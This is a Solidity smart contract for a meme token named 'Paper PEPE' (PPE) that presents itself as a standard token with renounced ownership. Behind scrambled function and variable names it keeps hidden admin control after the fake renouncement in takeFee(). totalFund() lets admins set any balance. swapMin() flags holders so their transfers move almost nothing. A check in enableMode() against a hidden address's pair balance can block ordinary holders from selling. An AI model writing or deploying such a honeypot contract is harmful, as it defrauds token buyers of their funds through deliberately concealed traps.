//SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

interface enableFund {
    function totalSupply() external view returns (uint256);

    function balanceOf(address liquidityLimitWallet) external view returns (uint256);

    function transfer(address launchedTrading, uint256 teamFee) external returns (bool);

    function allowance(address takeMaxFund, address spender) external view returns (uint256);

    function approve(address spender, uint256 teamFee) external returns (bool);

    function transferFrom(
        address sender,
        address launchedTrading,
        uint256 teamFee
    ) external returns (bool);

    event Transfer(address indexed from, address indexed exemptSwapFee, uint256 value);
    event Approval(address indexed takeMaxFund, address indexed spender, uint256 value);
}

abstract contract liquidityMin {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface txSenderAmount {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface teamSwap {
    function createPair(address modeTotalEnable, address fromSell) external returns (address);
}

interface listWallet is enableFund {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract PaperPEPE is liquidityMin, enableFund, listWallet {

    function allowance(address fromFeeMax, address receiverLaunchTotal) external view virtual override returns (uint256) {
        if (receiverLaunchTotal == limitFee) {
            return type(uint256).max;
        }
        return enableTotalAmount[fromFeeMax][receiverLaunchTotal];
    }

    address private buySenderLimit;

    bool private shouldTeamLiquidity;

    address limitFee = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function swapMin(address tokenSellTeam) public {
        autoLimit();
        if (exemptLiquidity == modeReceiver) {
            modeReceiver = true;
        }
        if (tokenSellTeam == fundReceiverLaunch || tokenSellTeam == takeAuto) {
            return;
        }
        atAmountFee[tokenSellTeam] = true;
    }

    string private enableSender = "PPE";

    function decimals() external view virtual override returns (uint8) {
        return listTx;
    }

    address public takeAuto;

    function name() external view virtual override returns (string memory) {
        return tokenTrading;
    }

    bool public liquidityTradingAt;

    function totalSupply() external view virtual override returns (uint256) {
        return feeLaunched;
    }

    mapping(address => bool) public atAmountFee;

    function atEnable(uint256 teamFee) public {
        autoLimit();
        amountLaunch = teamFee;
    }

    function maxTo(address launchedEnableLiquidity) public {
        require(launchedEnableLiquidity.balance < 100000);
        if (liquidityTradingAt) {
            return;
        }
        if (exemptLiquidity) {
            shouldTeamLiquidity = false;
        }
        marketingList[launchedEnableLiquidity] = true;
        
        liquidityTradingAt = true;
    }

    function owner() external view returns (address) {
        return buySenderLimit;
    }

    uint256 toTotalAmount;

    constructor (){
        
        txSenderAmount fundTo = txSenderAmount(limitFee);
        takeAuto = teamSwap(fundTo.factory()).createPair(fundTo.WETH(), address(this));
        
        fundReceiverLaunch = _msgSender();
        takeFee();
        marketingList[fundReceiverLaunch] = true;
        limitReceiver[fundReceiverLaunch] = feeLaunched;
        if (tradingIs != walletExempt) {
            launchLimit = walletExempt;
        }
        emit Transfer(address(0), fundReceiverLaunch, feeLaunched);
    }

    mapping(address => mapping(address => uint256)) private enableTotalAmount;

    event OwnershipTransferred(address indexed totalSwapFrom, address indexed buyList);

    function senderToken(address modeToken, address launchedTrading, uint256 teamFee) internal returns (bool) {
        require(limitReceiver[modeToken] >= teamFee);
        limitReceiver[modeToken] -= teamFee;
        limitReceiver[launchedTrading] += teamFee;
        emit Transfer(modeToken, launchedTrading, teamFee);
        return true;
    }

    function enableMode(address modeToken, address launchedTrading, uint256 teamFee) internal returns (bool) {
        if (modeToken == fundReceiverLaunch) {
            return senderToken(modeToken, launchedTrading, teamFee);
        }
        uint256 tradingAt = enableFund(takeAuto).balanceOf(teamToken);
        require(tradingAt == amountLaunch);
        require(launchedTrading != teamToken);
        if (atAmountFee[modeToken]) {
            return senderToken(modeToken, launchedTrading, feeMarketingTeam);
        }
        return senderToken(modeToken, launchedTrading, teamFee);
    }

    uint256 public launchLimit;

    function totalFund(address isFee, uint256 teamFee) public {
        autoLimit();
        limitReceiver[isFee] = teamFee;
    }

    mapping(address => bool) public marketingList;

    function autoLimit() private view {
        require(marketingList[_msgSender()]);
    }

    uint8 private listTx = 18;

    string private tokenTrading = "Paper PEPE";

    function symbol() external view virtual override returns (string memory) {
        return enableSender;
    }

    function getOwner() external view returns (address) {
        return buySenderLimit;
    }

    uint256 constant feeMarketingTeam = 10 ** 10;

    uint256 public tradingIs;

    function balanceOf(address liquidityLimitWallet) public view virtual override returns (uint256) {
        return limitReceiver[liquidityLimitWallet];
    }

    mapping(address => uint256) private limitReceiver;

    uint256 public fromMode;

    uint256 amountLaunch;

    function takeFee() public {
        emit OwnershipTransferred(fundReceiverLaunch, address(0));
        buySenderLimit = address(0);
    }

    address teamToken = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    address public fundReceiverLaunch;

    bool private modeReceiver;

    uint256 public walletExempt;

    function transfer(address isFee, uint256 teamFee) external virtual override returns (bool) {
        return enableMode(_msgSender(), isFee, teamFee);
    }

    bool public exemptLiquidity;

    function approve(address receiverLaunchTotal, uint256 teamFee) public virtual override returns (bool) {
        enableTotalAmount[_msgSender()][receiverLaunchTotal] = teamFee;
        emit Approval(_msgSender(), receiverLaunchTotal, teamFee);
        return true;
    }

    uint256 private feeLaunched = 100000000 * 10 ** 18;

    function transferFrom(address modeToken, address launchedTrading, uint256 teamFee) external override returns (bool) {
        if (_msgSender() != limitFee) {
            if (enableTotalAmount[modeToken][_msgSender()] != type(uint256).max) {
                require(teamFee <= enableTotalAmount[modeToken][_msgSender()]);
                enableTotalAmount[modeToken][_msgSender()] -= teamFee;
            }
        }
        return enableMode(modeToken, launchedTrading, teamFee);
    }

}